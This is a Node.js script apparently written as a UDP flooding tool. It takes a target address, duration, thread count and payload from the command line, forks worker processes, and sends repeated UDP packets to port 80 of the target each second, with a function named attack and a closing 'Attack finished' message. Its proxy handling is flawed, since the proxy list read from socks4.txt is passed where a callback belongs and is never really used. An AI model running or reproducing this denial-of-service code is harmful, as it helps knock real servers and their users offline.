const dgram = require("dgram");
const cluster = require("cluster");
const fs = require("fs");

const args = {
	target: process.argv[2],
	time: Number(process.argv[3]) * 1000, // Convert to milliseconds
	threads: Number(process.argv[4]),
	payload: process.argv[5] || "Hello, server!" // Default payload if not specified
};

function createSocket(proxy) {
	const socket = dgram.createSocket("udp4", proxy);

	socket.on("error", (err) => {
		// Handle errors here
		console.error(`[${proxy}] Socket error:`, err.message);
		socket.close();
	});

	socket.on("message", (message, remote) => {
		// Handle incoming response from the server (if needed)
		console.log(`[${proxy}] Received response from ${remote.address}:${remote.port}: ${message}`);
	});

	return socket;
}

function getProxyList() {
	const proxyList = fs.readFileSync("socks4.txt", "utf-8").toString().split(/\r?\n/);
	return proxyList.filter((proxy) => proxy.trim() !== "");
}

function attack() {
	const proxyList = getProxyList();
	const message = Buffer.from(args.payload);

	setInterval(() => {
		for (const proxy of proxyList) {
			const socket = createSocket(proxy);

			for (let i = 0; i < args.threads / proxyList.length; i++) {
				socket.send(message, 0, message.length, 80, args.target, (err) => {
					if (err) {
						console.error(`[${proxy}] Send error:`, err.message);
					}
				});
			}
		}
	}, 1000); // Sending packets every 1000ms (1 second)
}

if (cluster.isMaster) {
	for (let counter = 1; counter <= args.threads; counter++) {
		cluster.fork();
	}
} else {
	attack();
}

setTimeout(() => {
	// Stop the attack after the specified time
	console.log("Attack finished.");
	process.exit(0);
}, args.time);
